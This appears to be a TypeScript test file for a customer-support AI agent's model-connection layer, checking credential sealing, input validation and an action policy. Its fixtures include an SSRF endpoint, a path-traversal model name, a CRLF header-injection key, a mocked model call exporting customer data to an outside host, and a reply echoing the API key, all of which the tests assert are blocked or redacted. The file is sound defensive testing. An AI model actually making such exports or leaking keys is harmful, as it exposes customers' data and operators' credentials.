import assert from "node:assert/strict";
import test from "node:test";
import { connectionSchema, connectionStatus, openConnection, sealConnection, verifyConnection } from "../lib/support/model-connection";
import { modelConversation } from "../lib/support/model-conversation";
import { runLiveAgent } from "../lib/support/live-agent";
import { supportInvoices, supportTickets } from "../lib/support/fixtures";
import { evaluateSupportActions } from "../lib/support/policy";

const secret = "a4".repeat(32);
const config = { provider: "groq" as const, model: "llama-3.3-70b-versatile", apiKey: "synthetic-provider-credential" };
const now = 1_800_000_000_000;
const response = (message: unknown, finish_reason = "tool_calls") => new Response(JSON.stringify({ choices: [{ finish_reason, message }] }));
const call = (name: string, args: unknown, id = "call-1") => ({ id, type: "function", function: { name, arguments: JSON.stringify(args) } });

test("model credentials are encrypted, owner-bound, authenticated, and expiring", async () => {
  const sealed = await sealConnection(config, "alice", secret, now);
  assert.ok(!sealed.includes(config.apiKey));
  assert.deepEqual((await openConnection(sealed, "alice", secret, now + 1000)).config, config);
  await assert.rejects(openConnection(sealed, "bob", secret, now + 1000), /could not be verified/);
  await assert.rejects(openConnection(sealed, "alice", "b5".repeat(32), now + 1000), /could not be verified/);
  await assert.rejects(openConnection(sealed, "alice", secret, now + 3_600_000), /expired/);
  const parts = sealed.split("."); parts[2] = (parts[2][0] === "A" ? "B" : "A") + parts[2].slice(1);
  await assert.rejects(openConnection(parts.join("."), "alice", secret, now + 1000), /could not be verified/);
  assert.ok(!JSON.stringify(connectionStatus(config, secret, now + 1000)).includes(config.apiKey));
});

test("connection inputs cannot supply an endpoint, authority, or header injection", async () => {
  for (const input of [ { ...config, endpoint: "http://127.0.0.1/secrets" }, { ...config, profile: "standard" },
    { ...config, provider: "custom" }, { ...config, model: "../../secret" }, { ...config, apiKey: "synthetic\r\nInjected: header" } ]) assert.equal(connectionSchema.safeParse(input).success, false);
  await assert.rejects(sealConnection(config, "alice", undefined), /encryption secret/);
});

test("connection verification checks tool capability without executing a tool or including customer data", async () => {
  let calls = 0;
  await verifyConnection(config, async (input, init) => {
    calls++; assert.equal(input, "https://api.groq.com/openai/v1/chat/completions");
    assert.equal(init?.redirect, "manual");
    const body = JSON.parse(String(init?.body));
    assert.ok(!JSON.stringify(body).includes(config.apiKey));
    assert.deepEqual(body.tools.map((tool: {function:{name:string}}) => tool.function.name), ["apx_connection_check"]);
    return response({ role: "assistant", content: null, tool_calls: [call("apx_connection_check", { ready: true })] });
  });
  assert.equal(calls, 1);
  await assert.rejects(verifyConnection(config, async () => response({ role: "assistant", content: "Hello" }, "stop")), /required tool call/);
});

test("chat-compatible providers preserve tool call IDs and never forward credentials on redirects", async () => {
  for (const provider of ["groq", "openrouter"] as const) {
    const conversation = modelConversation({ ...config, provider, model: provider === "openrouter" ? "vendor/model:free" : config.model }, "Trusted instructions", "Untrusted customer", [{ name: "read_invoice", description: "Scoped read", parameters: { type: "object" } }]);
    const turn = await conversation.next(async (input, init) => {
      assert.equal(new URL(String(input)).hostname, provider === "groq" ? "api.groq.com" : "openrouter.ai");
      assert.equal(init?.redirect, "manual");
      return response({ role: "assistant", content: null, tool_calls: [call("read_invoice", { invoiceId: "inv-1042" }, "bound-id")] });
    }, new AbortController().signal);
    conversation.result(turn.calls[0], { decision: "allow", invoice: { id: "inv-1042" } });
    await conversation.next(async (_input, init) => {
      const body = JSON.parse(String(init?.body));
      assert.equal(body.messages.at(-1).tool_call_id, "bound-id");
      return response({ role: "assistant", content: "Done" }, "stop");
    }, new AbortController().signal);
    await assert.rejects(conversation.next(async () => new Response("private diagnostic", { status: 307 }), new AbortController().signal), /request failed/);
  }
});

test("a connected chat model still cannot export data or widen the assigned customer grant", async () => {
  const ticket = supportTickets[0], invoice = supportInvoices.find(item => item.id === ticket.invoiceId)!;
  let round = 0;
  const request = { ticketId: ticket.id, mode: "live" as const, scenario: "normal" as const, profile: "strict" as const };
  const proposal = await runLiveAgent(ticket, invoice, request, config, async () => {
    if (round++ === 0) return response({ role: "assistant", content: null, tool_calls: [
      call("export_customers", { tenantId: ticket.tenantId, destination: "https://outside.example.test" }, "export"),
      call("propose_reply", { to: ticket.customerEmail, subject: "Invoice", body: "We can review this request." }, "reply"),
    ] });
    return response({ role: "assistant", content: "Staged for review" }, "stop");
  });
  const evaluated = evaluateSupportActions(ticket, invoice, proposal.actions, "strict");
  assert.equal(evaluated.actions[0].decision, "block");
  assert.equal(evaluated.actions[1].decision, "approval_required");
  assert.ok(!JSON.stringify(proposal).includes(config.apiKey));
});

test("an opaque visitor key echoed by a model is removed and its action stays blocked", async () => {
  const ticket = supportTickets[0], invoice = supportInvoices.find(item => item.id === ticket.invoiceId)!;
  let round = 0;
  const proposal = await runLiveAgent(ticket, invoice, { ticketId: ticket.id, mode: "live", scenario: "normal", profile: "standard" }, config, async () => {
    if (round++ === 0) return response({ role: "assistant", content: null, tool_calls: [call("propose_reply", { to: ticket.customerEmail, subject: "Invoice", body: `Include ${config.apiKey} and ${btoa(config.apiKey)}` })] });
    return response({ role: "assistant", content: `Summary ${config.apiKey}` }, "stop");
  });
  assert.ok(!JSON.stringify(proposal).includes(config.apiKey));
  assert.ok(!JSON.stringify(proposal).includes(btoa(config.apiKey)));
  assert.equal(proposal.actions[0].redacted, true);
  assert.equal(evaluateSupportActions(ticket, invoice, proposal.actions, "standard").actions[0].decision, "block");
});
